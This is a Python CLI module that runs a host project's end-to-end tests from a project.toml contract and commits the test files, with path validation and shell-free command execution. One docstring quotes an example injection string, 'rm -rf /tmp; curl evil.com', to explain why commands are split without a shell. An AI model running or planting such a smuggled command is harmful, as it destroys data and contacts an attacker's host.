"""Shield commands - host-project e2e execution helpers.

Shield writes e2e tests into the host project's own test assets (for example
``tests/e2e/`` or ``apps/web/tests/e2e/``), not into ``.louke/``. The generic
automation boundary that *is* appropriate for a tool is:

- read the Archer-authored ``[e2e]`` contract from ``.louke/project/project.toml``
- optionally start the host project
- wait until the host project is ready
- run the host project's own e2e command
- teardown the host project
- commit the e2e-related host-project paths

What Shield no longer does:
- generate a one-size-fits-all scaffold template
- assume e2e tests live under ``.louke/project/specs/.../tests/e2e/``
- assume every project uses ``python -m pytest`` / browser flags
"""

import shlex
import subprocess
import sys
import time
from pathlib import Path
from typing import List, Optional

from ._common import _read_project_info_field, _toml_load, git, PROJECT_INFO_PATH
from .stage_results import write_stage_result


def register(subparsers):
    parser = subparsers.add_parser(
        "shield", help="e2e test authoring (Shield, B level)"
    )
    sub = parser.add_subparsers(dest="command", required=True, metavar="<command>")

    p = sub.add_parser(
        "run-e2e", help="run host-project e2e per project.toml [e2e] contract"
    )
    p.add_argument(
        "--no-env",
        action="store_true",
        help="skip auto start/ready/teardown (user started manually)",
    )

    p = sub.add_parser(
        "commit-e2e", help="commit host-project e2e files (git add + commit + push)"
    )
    p.add_argument("--message", required=True)
    p.add_argument(
        "--paths",
        nargs="+",
        help="host-project paths to stage (defaults to [e2e].paths in project.toml)",
    )


def run(args):
    handlers = {
        "run-e2e": cmd_run_e2e,
        "commit-e2e": cmd_commit_e2e,
    }
    return handlers.get(args.command, lambda _: 1)(args) or 0


def _read_e2e_config() -> dict:
    """Read the Archer-authored [e2e] section of project.toml.

    Schema:
        [e2e]
        run = "pytest -q tests/e2e"                 # required for lk agent shield run-e2e
        paths = ["tests/e2e", "tests/fixtures"]    # optional default for commit-e2e
        cwd = "apps/api"                           # optional working directory, relative to repo root
        start = "docker compose up -d app db"      # optional
        ready = "curl -sf http://localhost/health" # optional
        ready_timeout_seconds = 60                 # optional, default 60
        teardown = "docker compose down"           # optional
    """
    data = _toml_load(PROJECT_INFO_PATH)
    if not data:
        return {}
    return data.get("e2e", {}) or {}


def _normalize_repo_relative_path(raw: str) -> str:
    p = Path(str(raw).strip())
    if not str(p):
        raise ValueError("empty path")
    if p.is_absolute():
        raise ValueError(f"absolute path not allowed: {raw}")
    parts = p.parts
    if ".." in parts:
        raise ValueError(f"path escapes repo root: {raw}")
    if parts and parts[0] == ".louke":
        raise ValueError(
            f"e2e paths must point to host-project assets, not .louke/: {raw}"
        )
    return p.as_posix()


def _resolve_commit_paths(cfg: dict, cli_paths: Optional[List[str]]) -> List[str]:
    raw_paths = cli_paths
    if not raw_paths:
        configured = cfg.get("paths")
        if isinstance(configured, str):
            raw_paths = [configured]
        elif isinstance(configured, list):
            raw_paths = [str(p) for p in configured]
        else:
            raw_paths = []
    normalized = []
    for raw in raw_paths:
        normalized.append(_normalize_repo_relative_path(raw))
    return normalized


def _resolve_e2e_cwd(cfg: dict) -> Path:
    raw = str(cfg.get("cwd", "")).strip()
    if not raw:
        return Path.cwd()
    rel = _normalize_repo_relative_path(raw)
    return Path.cwd() / rel


def _run_command(cmd_str: str, cwd: Path) -> int:
    """Safely execute a shell command. shlex.split + shell=False, prevents project.toml tampering injection.

    Even if project.toml is maliciously modified, shell metacharacters cannot be injected
    (e.g. `rm -rf /tmp; curl evil.com` is split by shlex into ['rm', '-rf', '/tmp;', 'curl', 'evil.com'], curl is not executed).
    """
    if not cmd_str or not cmd_str.strip():
        return 0
    try:
        args = shlex.split(cmd_str)
    except ValueError as e:
        print(f"[shield] command parse failed: {cmd_str!r} ({e})", file=sys.stderr)
        return 1
    if not args:
        return 0
    return subprocess.run(args, cwd=cwd, shell=False, check=False).returncode


def _wait_ready(ready_cmd: str, cwd: Path, timeout_seconds: int) -> bool:
    """Poll the ready command until exit 0 or timeout."""
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        if _run_command(ready_cmd, cwd) == 0:
            return True
        time.sleep(2)
    return False


def cmd_run_e2e(args):
    """Run host-project e2e per the generic [e2e] contract."""
    env = _read_e2e_config()
    cwd = _resolve_e2e_cwd(env)
    spec_id = _read_project_info_field("Spec ID").strip()

    run_cmd = str(env.get("run", "")).strip()
    if not run_cmd:
        print(
            "[shield] missing [e2e].run in .louke/project/project.toml", file=sys.stderr
        )
        print(
            "[shield] Archer must define the host-project e2e command (for example: pytest -q tests/e2e)",
            file=sys.stderr,
        )
        if spec_id:
            write_stage_result(
                spec_id=spec_id,
                stage="M-E2E",
                kind="author-result",
                role="Shield",
                verdict="fail",
                reviewed_targets=_resolve_commit_paths(env, None),
                blocking_findings=["missing [e2e].run in .louke/project/project.toml"],
            )
        return 1

    start = "" if args.no_env else str(env.get("start", "")).strip()
    ready = "" if args.no_env else str(env.get("ready", "")).strip()
    teardown_cmd = "" if args.no_env else str(env.get("teardown", "")).strip()
    try:
        ready_timeout = int(env.get("ready_timeout_seconds", 60))
    except (TypeError, ValueError):
        ready_timeout = 60

    print("=== Run E2E ===")
    print("Config source: project.toml [e2e] section")
    print(f"Workdir: {cwd}")
    print(f"Run command: {run_cmd}")
    if args.no_env:
        print("Environment orchestration: disabled via --no-env")

    # 1. Start
    if start:
        print(f"\n[e2e] start: {start}")
        rc = _run_command(start, cwd)
        if rc != 0:
            print(f"[e2e] start failed (rc={rc})", file=sys.stderr)
            if spec_id:
                write_stage_result(
                    spec_id=spec_id,
                    stage="M-E2E",
                    kind="author-result",
                    role="Shield",
                    verdict="fail",
                    reviewed_targets=_resolve_commit_paths(env, None),
                    blocking_findings=[f"e2e start failed (rc={rc})"],
                    metadata={"run_command": run_cmd, "cwd": str(cwd)},
                )
            return rc

    # 2. Wait ready (poll the ready command until exit 0 or timeout)
    if ready:
        print(f"\n[e2e] waiting ready ({ready}, timeout {ready_timeout}s)")
        if not _wait_ready(ready, cwd, ready_timeout):
            print(f"[e2e] timeout waiting ready ({ready_timeout}s)", file=sys.stderr)
            if teardown_cmd:
                print(f"[e2e] teardown (after timeout): {teardown_cmd}")
                _run_command(teardown_cmd, cwd)
            if spec_id:
                write_stage_result(
                    spec_id=spec_id,
                    stage="M-E2E",
                    kind="author-result",
                    role="Shield",
                    verdict="fail",
                    reviewed_targets=_resolve_commit_paths(env, None),
                    blocking_findings=[f"timeout waiting ready ({ready_timeout}s)"],
                    metadata={"run_command": run_cmd, "cwd": str(cwd)},
                )
            return 1
        print("[e2e] ready")

    # 3. Run e2e
    print(f"\n[e2e] run: {run_cmd}")
    rc = _run_command(run_cmd, cwd)
    print(f"[e2e] exit code: {rc}")

    # 4. Teardown (regardless of success or failure)
    if teardown_cmd:
        print(f"\n[e2e] teardown: {teardown_cmd}")
        _run_command(teardown_cmd, cwd)

    if spec_id:
        write_stage_result(
            spec_id=spec_id,
            stage="M-E2E",
            kind="author-result",
            role="Shield",
            verdict="pass" if rc == 0 else "fail",
            reviewed_targets=_resolve_commit_paths(env, None),
            blocking_findings=[] if rc == 0 else [f"e2e run failed (rc={rc})"],
            metadata={"run_command": run_cmd, "cwd": str(cwd)},
        )

    return rc


def cmd_commit_e2e(args):
    """Commit host-project e2e assets with proper format."""
    cwd = Path.cwd()
    cfg = _read_e2e_config()
    try:
        paths = _resolve_commit_paths(cfg, args.paths)
    except ValueError as e:
        print(f"[shield] invalid e2e path: {e}", file=sys.stderr)
        return 1
    if not paths:
        print("[shield] no e2e paths provided.", file=sys.stderr)
        print(
            "[shield] pass --paths <dir ...> or define [e2e].paths in .louke/project/project.toml",
            file=sys.stderr,
        )
        return 1

    print("=== Commit E2E ===")
    print(f"Paths: {', '.join(paths)}")
    print(f"Message: {args.message}")

    cmds = [
        ["git", "add", *paths],
        ["git", "commit", "-m", f"e2e: {args.message}"],
        ["git", "push"],
    ]
    for cmd in cmds:
        rc, out, err = git(*cmd[1:], cwd=cwd)
        if rc != 0:
            print(f"failed: {' '.join(cmd)}\n{err}", file=sys.stderr)
            return rc
    print("✓ E2E committed and pushed")
    return 0
